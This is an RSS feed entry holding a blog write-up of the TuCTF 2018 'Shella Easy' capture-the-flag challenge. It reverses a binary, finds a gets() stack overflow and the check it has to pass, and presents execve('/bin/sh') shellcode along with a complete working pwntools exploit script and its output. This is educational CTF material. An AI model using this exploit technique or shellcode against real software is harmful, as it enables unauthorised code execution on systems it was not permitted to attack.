<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>shellcode on Anvbis</title><link>https://anvbis.github.io/tags/shellcode/</link><description>Recent content in shellcode on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><lastBuildDate>Wed, 11 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/tags/shellcode/index.xml" rel="self" type="application/rss+xml"/><item><title>TuCTF 2018 :: Shella Easy</title><link>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</link><pubDate>Wed, 11 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</guid><description>Reverse Engineering From the file command we can see that it is a dynamically linked linux executable.
$ file shella-easy shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped Running checksec on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>From the &lt;code>file&lt;/code> command we can see that it is a dynamically linked linux executable.&lt;/p>
&lt;pre>&lt;code>$ file shella-easy
shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
&lt;/code>&lt;/pre>&lt;p>Running &lt;code>checksec&lt;/code> on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).&lt;/p>
&lt;pre>&lt;code>$ checksec ./shella-easy
[*] './shella-easy'
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX disabled
PIE: No PIE (0x8048000)
RWX: Has RWX segments
&lt;/code>&lt;/pre>&lt;p>This means a few things for us:&lt;/p>
&lt;ul>
&lt;li>We know where everything is stored inside the binary.&lt;/li>
&lt;li>We can execute arbitrary shellcode on the stack.&lt;/li>
&lt;li>A stack overflow can give us control over program execution.&lt;/li>
&lt;/ul>
&lt;p>Running &lt;code>shella-easy&lt;/code> shows that the binary (at some point) takes user input. We&amp;rsquo;ll need to reverse it in order to understand how it does this, but it is a potential avenue for exploitation.&lt;/p>
&lt;pre>&lt;code>$ ./shella-easy
I'll have a 0xffc40780 with a side of fries thanks
asdfasdf
&lt;/code>&lt;/pre>&lt;p>Reversing the &lt;code>main&lt;/code> function of the binary reveals that it uses &lt;code>gets&lt;/code> to take user input. As we suspected, this is likely where we can exploit this.&lt;/p>
&lt;pre>&lt;code>0x08048532 83c408 add esp, 8
0x08048535 8d45b8 lea eax, [s]
0x08048538 50 push eax ; char *s
0x08048539 e852feffff call sym.imp.gets ; char *gets(char *s)
&lt;/code>&lt;/pre>&lt;p>Another important thing to note, is that the binary does have some protections in place against stack overflows; if the variable &lt;code>var_8h&lt;/code> is not set to &lt;code>0xdeadbeef&lt;/code>, the binary will immediately exit (instead of returning and giving us control).&lt;/p>
&lt;pre>&lt;code> 0x08048541 817df8efbead. cmp dword [var_8h], 0xdeadbeef
┌─&amp;lt; 0x08048548 7407 je 0x8048551
│ 0x0804854a 6a00 push 0 ; int status
│ 0x0804854c e84ffeffff call sym.imp.exit ; void exit(int status)
└─&amp;gt; 0x08048551 b800000000 mov eax, 0
0x08048556 8b5dfc mov ebx, dword [var_4h]
0x08048559 c9 leave
0x0804855a c3 ret
&lt;/code>&lt;/pre>&lt;p>We can also see that this variable &lt;code>var_8h&lt;/code> is initially set to a value of &lt;code>0xcafebabe&lt;/code> higher up in the instruction stream.&lt;/p>
&lt;pre>&lt;code>0x0804851b c745f8bebafe. mov dword [var_8h], 0xcafebabe
&lt;/code>&lt;/pre>&lt;p>We&amp;rsquo;ll want to find out where &lt;code>var_8h&lt;/code> is stored relative to where our input &lt;code>s&lt;/code> is stored, so we can overwrite the value of it in order to bypass this check (when we perform our overflow).&lt;/p>
&lt;p>Radare tells us a little about where these variables are supposed to be stored (in the &lt;code>main&lt;/code> function header), but we&amp;rsquo;ll want to verify this later.&lt;/p>
&lt;pre>&lt;code>; var char *s @ ebp-0x48
; var uint32_t var_8h @ ebp-0x8
; var int32_t var_4h @ ebp-0x4
&lt;/code>&lt;/pre>&lt;p>We can see that the &lt;code>var_8h&lt;/code> is stored below our input buffer &lt;code>s&lt;/code> on the stack, this is good for us as we can overwrite its value when we perform our overflow.&lt;/p>
&lt;p>A quick calculation &lt;code>0x48 - 0x8 = 0x40 = 64&lt;/code> tells us that &lt;code>var_8h&lt;/code> is stored 64 bytes after the start of our input buffer.&lt;/p>
&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>First, let&amp;rsquo;s spin up GDB and verify the location of &lt;code>var_8h&lt;/code> relative to our input buffer &lt;code>s&lt;/code>.&lt;/p>
&lt;p>We&amp;rsquo;ll set a breakpoint just after the &lt;code>gets&lt;/code> call so we can see what the stack looks like just after we&amp;rsquo;ve provided the binary with input.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; disassemble main
Dump of assembler code for function main:
...
0x08048539 &amp;lt;+94&amp;gt;: call 0x8048390 &amp;lt;gets@plt&amp;gt;
0x0804853e &amp;lt;+99&amp;gt;: add esp,0x4
0x08048541 &amp;lt;+102&amp;gt;: cmp DWORD PTR [ebp-0x8],0xdeadbeef
0x08048548 &amp;lt;+109&amp;gt;: je 0x8048551 &amp;lt;main+118&amp;gt;
0x0804854a &amp;lt;+111&amp;gt;: push 0x0
0x0804854c &amp;lt;+113&amp;gt;: call 0x80483a0 &amp;lt;exit@plt&amp;gt;
0x08048551 &amp;lt;+118&amp;gt;: mov eax,0x0
0x08048556 &amp;lt;+123&amp;gt;: mov ebx,DWORD PTR [ebp-0x4]
0x08048559 &amp;lt;+126&amp;gt;: leave
0x0804855a &amp;lt;+127&amp;gt;: ret
...
pwndbg&amp;gt; b *0x0804853e
Breakpoint 1 at 0x804853e
&lt;/code>&lt;/pre>&lt;p>We can now run the binary inside GDB and we&amp;rsquo;ll give it the value &lt;code>AAAA&lt;/code> when it prompts us for input, so we can easily see where our input is stored inside the stack.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; r
Starting program: ./shella-easy
Yeah I'll have a 0xffffcff0 with a side of fries thanks
AAAA
Breakpoint 1, 0x0804853e in main ()
...
&lt;/code>&lt;/pre>&lt;p>After dumping the relevant part of the stack, we can verify the location of &lt;code>var_8h&lt;/code> relative to &lt;code>s&lt;/code> with a simple calculation; &lt;code>0xffffd030 - 0xffffcff0 = 64&lt;/code>.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/20x $ebp-0x48
0xffffcff0: 0x41414141 0xf7fe3200 0x00000000 0xf7e02c1e
0xffffd000: 0xf7fb03fc 0xffffffff 0x00000000 0x080485ab
0xffffd010: 0x00000001 0xffffd0e4 0xffffd0ec 0x08048581
0xffffd020: 0xf7fe3230 0x00000000 0x08048569 0x00000000
0xffffd030: 0xcafebabe 0x00000000 0x00000000 0xf7de9e46
&lt;/code>&lt;/pre>&lt;p>While we&amp;rsquo;re at this breakpoint, we can also take a look at what the binary is leaking. Yep, it&amp;rsquo;s definitely the location of our input buffer on the stack, this will make the exploitation process a lot easier.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/x 0xffffcff0
0xffffcff0: 0x41414141
&lt;/code>&lt;/pre>&lt;p>Now let&amp;rsquo;s find the location of the function&amp;rsquo;s return address stored on the stack relative to our input buffer.&lt;/p>
&lt;p>We can write a quick script using pwntools that sends a cyclic pattern of bytes (with the &lt;code>var_8h&lt;/code> variable overwritten with &lt;code>0xdeadbeef&lt;/code>) that we can use to determine the location of the return address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">64&lt;/span>
var &lt;span style="color:#f92672">=&lt;/span> p32(&lt;span style="color:#ae81ff">0xdeadbeef&lt;/span>)
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./shella-easy&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>debug(r)
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> var &lt;span style="color:#f92672">+&lt;/span> cyclic(&lt;span style="color:#ae81ff">64&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We know that the program should crash once we&amp;rsquo;ve overwritten the return address with our bad data. So printing the value of &lt;code>$eip&lt;/code> after the crash should give us the bytes that the return address was overwritten with.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; p $eip
$1 = (void (*)()) 0x61616163
&lt;/code>&lt;/pre>&lt;p>We can use pwntools' &lt;code>cyclic_find&lt;/code> function and the bytes contained within &lt;code>eip&lt;/code> above, in order to find the offset of the return address from the end of our payload.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x61616163&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">8&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now that we know the location of &lt;code>var_8h&lt;/code> and the return address relative to our input buffer we can begin to craft our exploit.&lt;/p>
&lt;p>We know that we can execute arbitrary code within the stack, so let&amp;rsquo;s write up some quick shellcode to give us an interactive shell.&lt;/p>
&lt;pre>&lt;code>.global _start
_start:
.intel_syntax noprefix
shell:
push 0x0068732f # &amp;quot;/sh&amp;quot;
push 0x6e69622f # &amp;quot;/bin&amp;quot;
mov ebx, esp # &amp;quot;/bin/sh&amp;quot;
mov ecx, 0
mov edx, 0
mov eax, 11
int 0x80 # execve(&amp;quot;/bin/sh&amp;quot;, 0, 0)
exit:
mov ebx, 0 # exit code
mov eax, 0
int 0x80 # exit(0)
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s compile our shellcode, and get a representation of it that we can use in our exploit code.&lt;/p>
&lt;pre>&lt;code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
$ objcopy --dump-section .text=payload shellcode
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">1&lt;/span>]: open(&lt;span style="color:#e6db74">&amp;#39;payload&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
Out[&lt;span style="color:#ae81ff">1&lt;/span>]: &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">h/bin&lt;/span>&lt;span style="color:#ae81ff">\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we can build our exploit. Here is an outline of what we want to achieve:&lt;/p>
&lt;ul>
&lt;li>Capture the leaked stack address.&lt;/li>
&lt;li>Overwrite &lt;code>var_8h&lt;/code> with &lt;code>0xdeadbeef&lt;/code>.&lt;/li>
&lt;li>Overwrite the return address using the leak.&lt;/li>
&lt;li>Get code execution.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
buf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">h/bin&lt;/span>&lt;span style="color:#ae81ff">\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(buf))
var &lt;span style="color:#f92672">=&lt;/span> p32(&lt;span style="color:#ae81ff">0xdeadbeef&lt;/span>)
off &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./shella-easy&amp;#39;&lt;/span>)
&lt;span style="color:#75715e">#gdb.attach(r)&lt;/span>
&lt;span style="color:#75715e"># capture the leaked stack address&lt;/span>
r&lt;span style="color:#f92672">.&lt;/span>readuntil(&lt;span style="color:#e6db74">&amp;#39;Yeah I&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">ll have a &amp;#39;&lt;/span>)
leak &lt;span style="color:#f92672">=&lt;/span> p32(eval(r&lt;span style="color:#f92672">.&lt;/span>read(&lt;span style="color:#ae81ff">10&lt;/span>)))
r&lt;span style="color:#f92672">.&lt;/span>clean()
&lt;span style="color:#75715e"># send our payload to the binary&lt;/span>
r&lt;span style="color:#f92672">.&lt;/span>writeline(buf &lt;span style="color:#f92672">+&lt;/span> pad &lt;span style="color:#f92672">+&lt;/span> var &lt;span style="color:#f92672">+&lt;/span> off &lt;span style="color:#f92672">+&lt;/span> leak)
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s the exploit in action.&lt;/p>
&lt;pre>&lt;code>./exploit.py
[+] Starting local process './shella-easy': pid 3768
[*] Switching to interactive mode
$ cat flag.txt
TuCTF{Shella Easy}
&lt;/code>&lt;/pre></content></item></channel></rss>